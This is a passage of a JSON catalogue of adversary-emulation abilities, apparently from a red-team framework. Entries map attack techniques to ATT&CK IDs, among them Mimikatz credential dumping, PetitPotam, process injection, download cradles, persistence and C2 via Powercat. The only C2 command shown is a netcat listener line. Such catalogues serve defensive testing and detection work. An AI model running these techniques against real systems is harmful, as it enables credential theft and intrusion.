        "ability_id": "2fc2b9c9b48990938653dbe8966d487d",
        "technique_id": "T1546",
        "repeatable": false
    },
    {
        "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Forced Authentication",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PetitPotam",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "118b56eddccdf2cc0ed064e73ff33a28",
        "technique_id": "T1187",
        "repeatable": false
    },
    {
        "description": "Scan ports to check for listening ports for the local host 127.0.0.1",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Port Scan NMap for Windows",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "d6d77e5399e89ad6557bd40defef7217",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "Scan ports to check for listening ports with python\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Port Scan using python",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "518cee20267133203fc5d92cdc38af8c",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Potentially Unwanted Applications (PUA)",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "03a80d4a4c02d99295b5901ee695cc79",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "Executes a hashdump by reading the hashes from the registry.",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: Security Account Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerDump Hashes and Usernames from Registry",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "25e524a8b1364858658ca0f6751da778",
        "technique_id": "T1003.002",
        "repeatable": false
    },
    {
        "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Input Capture: GUI Input Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell - Prompt User for Password",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6f5096d87a8f9ac4c397215cb58cc978",
        "technique_id": "T1056.002",
        "repeatable": false
    },
    {
        "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Command Execution",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "2f5e819a0fdae54834fa85a0b797d302",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Downgrade Attack",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "48a861eb5802bd7abdaa64b4fcd30924",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Fileless Script Execution",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "94bd4682c1c109fcc1d4011c3a616405",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Powershell execution of known Malicious PowerShell Cmdlets",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Invoke Known Malicious Cmdlets",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "a9df2530a06e1aa7d1ba9e9309364b9f",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Download",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Invoke MimiKats",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "ccdb8caf-c69e-424b-b930-551969450c57",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Distributed Component Object Model",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Lateral Movement using MMC20",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "68df771632fd6216858edd20458ee5bb",
        "technique_id": "T1021.003",
        "repeatable": false
    },
    {
        "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Modify A Scheduled Task",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "4150ef18184112953ae5742a3f8de64e",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "Capture running processes via PowerShell",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Process Enumeration",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "4d9b079c-9ede-4116-8b14-72ad3a5533af",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Registry RunOnce",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "3c0760559a620aad7664cdf98f486127",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell Session Creation and Use",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "bba7fe7940f8719efa3c38e54ec79e2c",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Download",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell bitly Link Download",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "bfff9006-d1fb-46ce-b173-92cb04e9a031",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "System Information Gathering Script",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell information gathering",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "702bfdd2-9947-4eda-b551-c3a1ea9a59a2",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Discover the PowerShell version",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerShell version",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "29451844-9b76-4e16-a9ee-d6feab4b24db",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerUp Invoke-AllChecks",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "ba763ea19604a73e3e1f9d9d8d86d9cc",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PowerView ShareFinder",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "8f17c5e3ca9e2db88111d002c811ddac",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Non-Application Layer Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powercat C2",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "981cf81e3bb0649fafc31217c8cbc00d",
        "technique_id": "T1095",
        "repeatable": false
    },
    {
        "description": "Use Invoke-Mimikatz",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "Elevated",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powerkatz (Staged)",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powershell Cmdlet Scheduled Task",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "ba8ddc38c7c6ced12fecc0d695c5e57c",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powershell Execute COM Object",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d94bcdfc9d0f769b062e1960f7af6804",
        "technique_id": "T1546.015",
        "repeatable": false
    },
    {
        "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powershell Mimikatz",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "87601246abde270b512d08c868c03bfb",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powershell MsXml COM object - with prompt",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "fe19a5f38374d4f46032ee18ac1aa474",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powershell XML requests",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "724693bb7a55fdc94d84bd52d58c60b7",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powershell enumerate domains and forests",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "109b73cd939f52db23f842589138d79c",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
        "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Powershell invoke mshta.exe download",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "b7dbd4b15fb43757def1ccebfc02b350",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "See the most used WIFI networks of a machine",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "wifi.sh"
                ],
                "command": "./wifi.sh pref",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.wifipref",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "wifi.network.ssid",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Preferred WIFI",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Prevents Powershell history\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Prevent Powershell History Logging",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "df94858e92a23d274ac1d70133d9150f",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Print the current working directory on the system",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "pwd",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Print Working Directory",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "6e1a53c0-7352-4899-be35-fa7f364d5722",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Create a ZIP file from a folder in a remote drive\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Printer Migration Command-Line Tool UNC share folder into a zip file",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "060cb51c43467792396a7ba1e9ed087b",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Private Keys",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "e16297dffb68b5ffa5b243243233cd1c",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Process Discovery - Get-Process",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "1d48fc4147a7bcd47bdf60db7dde9640",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Process Discovery - get-wmiObject",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "1ddf2b8ee6a56ce9f9132a168947653e",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Process Discovery - tasklist",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f8de05d1741dcc468f772ab0ff4dac72",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Process Discovery - wmic process",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "b2a1e430ca6d36eb5af2fe666e769847",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Process Hollowing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Process Hollowing using PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "90d152c066fad4dc7d54b9a9e4443b50",
        "technique_id": "T1055.012",
        "repeatable": false
    },
    {
        "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Asynchronous Procedure Call",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Process Injection via C#",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "02a8d7845cd152ae5878f3dfea94e9a4",
        "technique_id": "T1055.004",
        "repeatable": false
    },
    {
        "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Dynamic-link Library Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Process Injection via mavinject.exe",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d7047b60bc9fe8c0b7a99f0d3dbdce55",
        "technique_id": "T1055.001",
        "repeatable": false
    },
    {
        "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ProtocolHandler.exe Downloaded a Suspicious File",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2c276ef775e39925256bff68ce6ba19f",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Proxy: Multi-hop Proxy",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Psiphon",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "acca08a5361f1b4aee26128810327533",
        "technique_id": "T1090.003",
        "repeatable": false
    },
    {
        "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Script Proxy Execution: Pubprn",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PubPrn.vbs Signed Script Bypass",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "35a47c6fdbc5e6756664a2b7ecc1f90b",
        "technique_id": "T1216.001",
        "repeatable": false
    },
    {
        "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Encrypted for Impact",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "PureLocker Ransom Note",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "d82ceb9939d3d920ee550187ad8235c8",
        "technique_id": "T1486",
        "repeatable": false
    },
    {
        "description": "A list of commands known to be performed by Qakbot for recon purposes",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Qakbot Recon",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "b57491a5e201a3575d6b63ca7700a18b",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Query Registry using PowerShell Get-ItemProperty",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Query Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Query Registry",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "2488245e-bcbd-405d-920e-2de27db882b3",
        "technique_id": "T1012",
        "repeatable": false
    },
    {
        "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Query Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Query Registry",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "1d3cb1429f530cb89f41c65e57f03db4",
        "technique_id": "T1012",
        "repeatable": false
    },
    {
        "description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Query Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Query Registry with Powershell cmdlets",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "691d489fe77afbfe8646419fce6759fd",
        "technique_id": "T1012",
        "repeatable": false
    },
    {
        "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Service Session Hijacking: RDP Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "RDP hijacking",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "831c7f8dda2eda2720f46aeba37cbe48",
        "technique_id": "T1563.002",
        "repeatable": false
    },
    {
        "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Remote Desktop Protocol",
        "requirements": [],
        "singleton": false,
